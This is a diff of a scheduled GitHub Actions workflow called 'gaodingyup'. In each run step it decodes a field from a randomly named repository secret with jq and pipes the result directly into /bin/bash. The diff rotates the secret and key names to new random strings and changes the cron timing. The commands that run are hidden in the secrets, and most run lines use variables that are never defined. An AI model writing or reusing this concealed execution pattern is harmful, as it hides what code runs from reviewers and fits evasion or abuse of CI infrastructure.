@@ -1,27 +1,18 @@
 name: gaodingyup
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
-
+    - cron: '38 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaodingyup
         env:
-          ohg93279: ${{ secrets.ohg93279 }}
+          etb4890: ${{ secrets.etb4890 }}
         run: |
-          echo $ohg93279 | jq -r .uzz9065 | /bin/bash
-          echo $abiu9258 | jq -r .beiz68389 | /bin/bash
-          echo $rrj47 | jq -r .fmf1 | /bin/bash
-          echo $gk9409 | jq -r .mye92891 | /bin/bash
-          echo $um60 | jq -r .fvy81988 | /bin/bash
-          echo $m69 | jq -r .du25 | /bin/bash
-          echo $wm65 | jq -r .gmc5716 | /bin/bash
-          echo $f6247 | jq -r .s6 | /bin/bash
-          echo $o30 | jq -r .lhaq4360 | /bin/bash
-          echo $jkye2350 | jq -r .fkh6196 | /bin/bash
+          echo $etb4890 | jq -r .esq9000 | /bin/bash
+          echo $wyfe008 | jq -r .czm5 | /bin/bash
 
